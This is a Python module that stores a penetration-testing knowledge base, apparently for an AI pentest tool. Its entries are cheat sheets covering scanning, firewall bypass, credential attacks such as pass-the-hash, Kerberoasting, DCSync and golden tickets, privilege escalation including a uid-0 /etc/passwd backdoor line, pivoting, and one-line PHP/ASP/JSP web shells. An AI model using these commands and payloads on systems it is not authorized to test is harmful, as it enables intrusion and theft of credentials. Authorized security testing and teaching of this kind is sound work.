"""PenTest Knowledge Base - Comprehensive PenTest methodology and techniques."""

from dataclasses import dataclass, field
from typing import Optional
from enum import Enum


class KnowledgeCategory(str, Enum):
    """Categories of PenTest knowledge."""

    METHODOLOGY = "methodology"
    RECONNAISSANCE = "reconnaissance"
    EXPLOITATION = "exploitation"
    PRIVILEGE_ESCALATION = "privesc"
    POST_EXPLOITATION = "post_exploitation"
    PIVOTING = "pivoting"
    WEB = "web"
    AD = "active_directory"
    BINARY = "binary"
    IOT = "iot"
    CTF = "ctf"
    REPORTING = "reporting"
    TOOLS = "tools"
    CHEAT_SHEET = "cheat_sheet"


@dataclass
class KnowledgeEntry:
    """A single knowledge entry."""

    id: str
    title: str
    content: str
    category: KnowledgeCategory
    tags: list[str] = field(default_factory=list)
    source: Optional[str] = None
    importance: float = 0.5


# ============================================================
# PenTest METHODOLOGY
# ============================================================

METHODOLOGY_ENTRIES = [
    KnowledgeEntry(
        id="method_001",
        title="PenTest Engagement Methodology",
        content="""The PenTest penetration testing methodology follows these phases:
1. Pre-engagement: Scope, Rules of Engagement, Authorization
2. Reconnaissance: Passive and active information gathering
3. Scanning & Enumeration: Network, service, and application discovery
4. Vulnerability Analysis: Identify weaknesses in discovered services
5. Exploitation: Attempt to exploit identified vulnerabilities
6. Post-Exploitation: Privilege escalation, lateral movement, data exfiltration
7. Reporting: Document findings, evidence, and recommendations
8. Remediation Verification: Confirm fixes are effective""",
        category=KnowledgeCategory.METHODOLOGY,
        tags=["methodology", "phases", "overview"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="method_002",
        title="Adaptive Attack Strategy",
        content="""PenTest requires adaptive thinking, not scripted attacks:
- Observe the environment before acting
- Build a mental model of the network
- Generate hypotheses about attack paths
- Test hypotheses with appropriate tools
- Learn from failures and adapt
- Never follow a fixed attack chain
- Document everything for the report""",
        category=KnowledgeCategory.METHODOLOGY,
        tags=["adaptive", "strategy", "thinking"],
        importance=0.85,
    ),
]

# ============================================================
# RECONNAISSANCE
# ============================================================

RECON_ENTRIES = [
    KnowledgeEntry(
        id="recon_001",
        title="Nmap Scanning Techniques",
        content="""Nmap scanning techniques for PenTest:
- Host Discovery: nmap -sn 10.10.10.0/24
- Quick Scan: nmap -T4 -F target
- Full Port Scan: nmap -T4 -p- target
- Service Version: nmap -sV target
- OS Detection: nmap -O target
- Aggressive Scan: nmap -A target
- Stealth Scan: nmap -sS -T2 target
- UDP Scan: nmap -sU --top-ports 20 target
- Script Scan: nmap --script=default target
- Vulnerability Scan: nmap --script=vuln target""",
        category=KnowledgeCategory.RECONNAISSANCE,
        tags=["nmap", "scanning", "discovery"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="recon_002",
        title="Service Enumeration",
        content="""Service enumeration techniques:
- SMB: enum4linux -a target, smbclient -L target
- SSH: ssh -v target, nmap --script=ssh-auth-methods
- HTTP: nikto -h target, dirb target, gobuster dir -u target -w wordlist
- FTP: nmap --script=ftp-anon, ftp target
- LDAP: ldapsearch -h target -x -b "dc=domain,dc=com"
- RDP: nmap --script=rdp-enum-encryption
- MySQL: nmap --script=mysql-info
- MSSQL: nmap --script=mssql-info""",
        category=KnowledgeCategory.RECONNAISSANCE,
        tags=["enumeration", "services", "tools"],
        importance=0.85,
    ),
    KnowledgeEntry(
        id="recon_003",
        title="Network Mapping",
        content="""Network mapping and topology discovery:
- ARP Discovery: arp-scan -l, netdiscover -r network
- Routing Table: route -n, ip route
- Network Interfaces: ifconfig, ip addr
- DNS Enumeration: dig target, nslookup, host -a target
- Traceroute: traceroute target, mtr target
- VLAN Discovery: netdiscover -r vlan_network
- Firewall Detection: nmap -f -D RND:10 target""",
        category=KnowledgeCategory.RECONNAISSANCE,
        tags=["network", "mapping", "topology"],
        importance=0.8,
    ),
    KnowledgeEntry(
        id="recon_004",
        title="Firewall / Filter Identification (Go Deeper)",
        content="""Identifying the filtering mechanism protecting a subnet:
- ICMP Type 3 Code 13 (Communication Administratively Prohibited) = Cisco router / stateless ACL - THE PenTest firewall signature.
- ICMP Type 3 Code 10 (Host Administratively Prohibited) = iptables / stateful host deny.
- ICMP Type 3 Code 3 (Port Unreachable) confirms the host is ALIVE and routed behind the filter.
- 'closed' responses prove the host is live; 'filtered' responses mean silent-drop.
Mechanisms to distinguish: Router ACL, Firewall software, IP tables, Firewall device.
If the firewall admin left ICMP unreachable exposed, that is a misconfiguration finding.
Use pen-ai tool: filter_detect""",
        category=KnowledgeCategory.RECONNAISSANCE,
        tags=["firewall", "filter", "icmp", "cisco", "stateless", "router"],
        importance=0.95,
    ),
    KnowledgeEntry(
        id="recon_005",
        title="Stateless Filter Bypass (Source-Port Spoofing)",
        content="""Stateless ACLs with weak rules can be bypassed by spoofing the source port:
- FTP data channel uses source port 20, so nmap -g 20 can bypass an FTP-only rule.
- Other useful source ports: 53 (DNS), 67/68 (DHCP), 80/443 (web).
- Workflow: (1) baseline scan, (2) re-scan with -g <source_port>, (3) diff results to expose newly-visible ports.
- After bypass, enumerate the full attack surface and continue exploitation.
Also try fragmentation (-f) and -Pn to map the surface behind the ACL.
Use pen-ai tool: filter_sourceport_bypass""",
        category=KnowledgeCategory.RECONNAISSANCE,
        tags=["bypass", "stateless", "acl", "source-port", "ftp", "firewall"],
        importance=0.95,
    ),

]

# ============================================================
# EXPLOITATION
# ============================================================

EXPLOIT_ENTRIES = [
    KnowledgeEntry(
        id="exploit_001",
        title="Common Exploitation Techniques",
        content="""Common exploitation techniques for PenTest:
- Password Attacks: Hydra, Medusa, CrackMapExec
- SMB Attacks: smbclient, crackmapexec, smbmap
- SSH Attacks: hydra ssh, sshkey_brute
- Web Attacks: sqlmap, burpsuite, nikto
- Buffer Overflows: pattern_create, pattern_offset, msfvenom
- Metasploit: use exploit, set options, exploit
- Reverse Shells: bash, python, php, netcat
- Web Shells: uploads, cmd execution""",
        category=KnowledgeCategory.EXPLOITATION,
        tags=["exploitation", "techniques", "tools"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="exploit_002",
        title="Credential Attacks",
        content="""Credential attack techniques:
- Brute Force: hydra -l user -P wordlist target service
- Password Spraying: crackmapexec smb target -u users.txt -p password
- Credential Harvesting: mimikatz, laZagne, hashdump
- Pass-the-Hash: psexec.py -hashes lm:nt lm user@target
- Kerberoasting: GetUserSPNs.py domain/user:pass -dc-ip dc -request
- AS-REP Roasting: GetNPUsers.py domain/ -usersfile users.txt -format hashcat
- Password Cracking: hashcat -m hash_type hash wordlist, john hash""",
        category=KnowledgeCategory.EXPLOITATION,
        tags=["credentials", "passwords", "hashes"],
        importance=0.85,
    ),
]

# ============================================================
# PRIVILEGE ESCALATION
# ============================================================

PRIVESC_ENTRIES = [
    KnowledgeEntry(
        id="privesc_001",
        title="Linux Privilege Escalation",
        content="""Linux privilege escalation vectors:
- SUID Binaries: find / -perm -u=s -type f 2>/dev/null
- Sudo Misconfig: sudo -l
- Writable /etc/passwd: echo 'user:x:0:0::/root:/bin/bash' >> /etc/passwd
- Kernel Exploits: uname -a, searchsploit linux kernel version
- Cron Jobs: cat /etc/crontab, ls -la /etc/cron*
- Capabilities: getcap -r / 2>/dev/null
- PATH Hijacking: writable directories in $PATH
- Docker/LXC: groups, ls -la /var/run/docker.sock
- NFS Root Squash: showmount -e target
- SSH Keys: find / -name id_rsa 2>/dev/null""",
        category=KnowledgeCategory.PRIVILEGE_ESCALATION,
        tags=["linux", "privesc", "suid", "sudo"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="privesc_002",
        title="Windows Privilege Escalation",
        content="""Windows privilege escalation vectors:
- Token Manipulation: whoami /priv, incognito
- Unquoted Service Paths: wmic service get name,displayname,pathname
- Weak Service Permissions: accesschk /accepteula -uwcqv "Authenticated Users" *
- DLL Hijacking: check for writable DLL paths
- Registry Autorun: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- AlwaysInstallElevated: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
- Potato Attacks: JuicyPotato, PrintSpoofer, GodPotato
- UAC Bypass: eventvwr, fodhelper, computerdefaults
- Kernel Exploits: Windows Exploit Suggester""",
        category=KnowledgeCategory.PRIVILEGE_ESCALATION,
        tags=["windows", "privesc", "tokens", "services"],
        importance=0.9,
    ),
]

# ============================================================
# POST EXPLOITATION
# ============================================================

POST_EXPLOIT_ENTRIES = [
    KnowledgeEntry(
        id="post_001",
        title="Post-Exploitation Enumeration",
        content="""Post-exploitation enumeration commands:
Linux:
- System: uname -a, cat /etc/os-release
- Users: cat /etc/passwd, whoami, id
- Groups: cat /etc/group, groups
- Network: ifconfig, ip addr, route -n, netstat -tlnp
- Processes: ps aux
- Services: systemctl list-units --type=service
- Cron: crontab -l, cat /etc/crontab
- Files: find / -writable -type f 2>/dev/null

Windows:
- System: systeminfo, hostname
- Users: net user, whoami /all
- Groups: net localgroup administrators
- Network: ipconfig /all, netstat -ano
- Processes: tasklist /v
- Services: sc query, net start
- Scheduled Tasks: schtasks /query /fo LIST /v""",
        category=KnowledgeCategory.POST_EXPLOITATION,
        tags=["post-exploitation", "enumeration", "linux", "windows"],
        importance=0.85,
    ),
    KnowledgeEntry(
        id="post_002",
        title="Credential Harvesting",
        content="""Credential harvesting techniques:
Linux:
- Shadow File: cat /etc/shadow
- SSH Keys: find / -name id_rsa 2>/dev/null
- Bash History: cat ~/.bash_history
- Config Files: find / -name "*.conf" -o -name "*.cfg" 2>/dev/null
- Database Files: find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

Windows:
- SAM Database: reg save HKLM\SAM sam.hive
- SYSTEM Registry: reg save HKLM\SYSTEM system.hive
- Credentials: vaultcmd /listcreds
- Browser: LaZagne, BrowserHistory
- WiFi: netsh wlan show profiles
- Clipboard: powershell Get-Clipboard""",
        category=KnowledgeCategory.POST_EXPLOITATION,
        tags=["credentials", "harvesting", "passwords"],
        importance=0.8,
    ),
]

# ============================================================
# PIVOTING
# ============================================================

PIVOT_ENTRIES = [
    KnowledgeEntry(
        id="pivot_001",
        title="Pivoting Techniques",
        content="""Network pivoting techniques:
SSH Tunneling:
- Local: ssh -L 8080:internal:80 user@pivot
- Dynamic: ssh -D 1080 user@pivot
- Remote: ssh -R 8080:target:80 user@pivot

ProxyChains:
- Configure /etc/proxychains.conf
- proxychains nmap -sT -Pn target

Chisel:
- Server: chisel server --reverse --port 8080
- Client: chisel client server:8080 R:socks

Port Forwarding:
- rinetd: forward local_port target_ip target_port
- socat: TCP-LISTEN:8080,fork TCP:target:80

Metasploit:
- route add subnet netmask session_id
- autoroute -s subnet""",
        category=KnowledgeCategory.PIVOTING,
        tags=["pivoting", "tunneling", "proxy"],
        importance=0.85,
    ),
    KnowledgeEntry(
        id="pivot_002",
        title="Double Pivoting",
        content="""Double pivoting workflow:
1. Establish first pivot from attack box to DMZ
2. Enumerate internal network from DMZ host
3. Find route to deeper network
4. Establish second pivot through DMZ to internal
5. Continue enumeration from internal position

Tools for double pivoting:
- SSH multi-hop: ssh -J user@pivot1 user@pivot2
- Chisel chains: Multiple chisel connections
- ProxyChains: Chain multiple proxies
- Metasploit: Multiple autoroutes

Important: Document each pivot hop for the report.""",
        category=KnowledgeCategory.PIVOTING,
        tags=["double-pivot", "chaining", "tunneling"],
        importance=0.8,
    ),
]

# ============================================================
# ACTIVE DIRECTORY
# ============================================================

AD_ENTRIES = [
    KnowledgeEntry(
        id="ad_001",
        title="Active Directory Enumeration",
        content="""AD enumeration techniques:
Domain Enumeration:
- enum4linux -a -u user -p pass target
- rpcclient -U user target
- ldapsearch -h dc -x -b "dc=domain,dc=com"

User Enumeration:
- net user /domain
- ldapsearch -x -b "dc=domain,dc=com" "(objectClass=user)"
- kerberos: GetUserSPNs.py domain/user:pass -dc-ip dc

Group Enumeration:
- net group /domain
- ldapsearch -x -b "dc=domain,dc=com" "(objectClass=group)"

Computer Enumeration:
- net group "Domain Computers" /domain
- ldapsearch -x -b "dc=domain,dc=com" "(objectClass=computer)"

SPN Enumeration:
- setspn -T domain -Q */*
- GetUserSPNs.py domain/user:pass""",
        category=KnowledgeCategory.AD,
        tags=["active-directory", "enumeration", "ldap", "kerberos"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="ad_002",
        title="AD Attack Techniques",
        content="""AD attack techniques:
Kerberoasting:
- GetUserSPNs.py domain/user:pass -request
- hashcat -m 13100 hashes.txt wordlist

AS-REP Roasting:
- GetNPUsers.py domain/ -usersfile users.txt -format hashcat

Pass-the-Hash:
- psexec.py -hashes lm:nt domain/user@target
- wmiexec.py -hashes lm:nt domain/user@target

Golden Ticket:
- ticketer.py -nthash krbtgt_hash -domain-sid SID -domain domain user

DCSync:
- secretsdump.py domain/user:pass@dc

Unconstrained Delegation:
- findDelegation.py domain/user:pass""",
        category=KnowledgeCategory.AD,
        tags=["active-directory", "kerberos", "attacks"],
        importance=0.9,
    ),
]

# ============================================================
# WEB APPLICATION
# ============================================================

WEB_ENTRIES = [
    KnowledgeEntry(
        id="web_001",
        title="Web Application Testing",
        content="""Web application testing techniques:
Reconnaissance:
- whatweb target
- wappalyzer
- dirb target wordlist
- gobuster dir -u target -w wordlist

Testing:
- nikto -h target
- sqlmap -u "target?id=1" --dbs
- burpsuite proxy and repeater
- ffuf -u target/FUZZ -w wordlist

Common Vulnerabilities:
- SQL Injection: ' OR 1=1--, UNION SELECT
- XSS: <script>alert(1)</script>
- CSRF: Cross-site request forgery tokens
- File Upload: bypass restrictions
- SSRF: Internal network access
- XXE: XML External Entity""",
        category=KnowledgeCategory.WEB,
        tags=["web", "owasp", "testing"],
        importance=0.85,
    ),
    KnowledgeEntry(
        id="web_002",
        title="Web Shell Upload",
        content="""Web shell upload techniques:
1. Find upload functionality
2. Bypass restrictions:
   - Change extension: .php5, .phtml, .php.jpg
   - Content-Type: image/jpeg
   - Double extension: shell.php.jpg
   - Null byte: shell.php%00.jpg
3. Upload PHP/ASP/JSP shell
4. Access uploaded shell
5. Execute commands

Common web shells:
- PHP: <?php system($_GET['cmd']); ?>
- ASP: <%Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll())%>
- JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>""",
        category=KnowledgeCategory.WEB,
        tags=["web", "upload", "shell"],
        importance=0.8,
    ),
]

# ============================================================
# BINARY EXPLOITATION
# ============================================================

BINARY_ENTRIES = [
    KnowledgeEntry(
        id="binary_001",
        title="Binary Exploitation Basics",
        content="""Binary exploitation fundamentals:
Buffer Overflow:
1. Find buffer size: pattern_create, pattern_offset
2. Check protections: checksec binary
3. Find JMP ESP: msf-nasm_shell, objdump
4. Generate shellcode: msfvenom -p linux/x86/shell_reverse_tcp
5. Construct payload: padding + EIP + NOP sled + shellcode

Format String:
- %x: Read stack
- %n: Write to address
- Exploit: AAAA%p.%p.%p.%p

Heap Exploitation:
- Use-After-Free
- Double Free
- Heap Overflow

Tools:
- GDB/GEF/pwndbg
- IDA Pro/Ghidra
- Radare2
- pwntools""",
        category=KnowledgeCategory.BINARY,
        tags=["binary", "exploitation", "buffer-overflow"],
        importance=0.85,
    ),
]

# ============================================================
# IoT
# ============================================================

IOT_ENTRIES = [
    KnowledgeEntry(
        id="iot_001",
        title="IoT Security Testing",
        content="""IoT security testing methodology:
Firmware Analysis:
- binwalk firmware.bin
- firmware-mod-kit
- jeepkin firmware.bin

Device Enumeration:
- nmap -sV -sC target
- snmpwalk -v2c -c public target
-zte.cfg parser for ZTE devices

Protocol Analysis:
- MQTT: mosquitto_sub -h target -t "#"
- CoAP: coap-client -m get coap://target
- Modbus: modbus-cli read-holding 1 0 10

Common Vulnerabilities:
- Default credentials
- Hardcoded passwords
- Insecure firmware updates
- Missing authentication
- Exposed services""",
        category=KnowledgeCategory.IOT,
        tags=["iot", "firmware", "protocols"],
        importance=0.8,
    ),
]

# ============================================================
# TOOLS CHEAT SHEET
# ============================================================

TOOLS_ENTRIES = [
    KnowledgeEntry(
        id="tools_001",
        title="Essential Pentesting Tools",
        content="""Essential tools for PenTest:
Recon: nmap, masscan, arp-scan, netdiscover
Enumeration: enum4linux, smbclient, nikto, gobuster, feroxbuster
Exploitation: metasploit, searchsploit, sqlmap, hydra
Post-Exploit: mimikatz, laZagne, linpeas, winpeas
Pivoting: chisel, ligolo-ng, ssh, proxychains
Web: burpsuite, ffuf, wfuzz, commix
Wireless: aircrack-ng, wifite
Password: hashcat, john the ripper, crunch
Forensics: volatility, autopsy, binwalk""",
        category=KnowledgeCategory.TOOLS,
        tags=["tools", "cheat-sheet"],
        importance=0.9,
    ),
    KnowledgeEntry(
        id="tools_002",
        title="Metasploit Commands",
        content="""Metasploit essential commands:
- search type:exploit platform:windows
- use exploit/windows/smb/ms17_010_eternalblue
- show options
- set RHOSTS target
- set LHOST attacker
- exploit / run
- background (Ctrl+Z)
- sessions -l
- sessions -i 1
- post/multi/gather/env
- post/linux/gather/enum_configs
- post/windows/gather/smart_hashdump""",
        category=KnowledgeCategory.TOOLS,
        tags=["metasploit", "framework"],
        importance=0.85,
    ),
]

# ============================================================
# ALL ENTRIES
# ============================================================

ALL_KNOWLEDGE_ENTRIES = (
    METHODOLOGY_ENTRIES
    + RECON_ENTRIES
    + EXPLOIT_ENTRIES
    + PRIVESC_ENTRIES
    + POST_EXPLOIT_ENTRIES
    + PIVOT_ENTRIES
    + AD_ENTRIES
    + WEB_ENTRIES
    + BINARY_ENTRIES
    + IOT_ENTRIES
    + TOOLS_ENTRIES
)


def get_all_entries() -> list[KnowledgeEntry]:
    """Get all knowledge entries."""
    return ALL_KNOWLEDGE_ENTRIES


def get_entries_by_category(category: KnowledgeCategory) -> list[KnowledgeEntry]:
    """Get entries by category."""
    return [e for e in ALL_KNOWLEDGE_ENTRIES if e.category == category]


def get_entries_by_tag(tag: str) -> list[KnowledgeEntry]:
    """Get entries by tag."""
    return [e for e in ALL_KNOWLEDGE_ENTRIES if tag.lower() in [t.lower() for t in e.tags]]


def get_entry_by_id(entry_id: str) -> Optional[KnowledgeEntry]:
    """Get entry by ID."""
    for entry in ALL_KNOWLEDGE_ENTRIES:
        if entry.id == entry_id:
            return entry
    return None
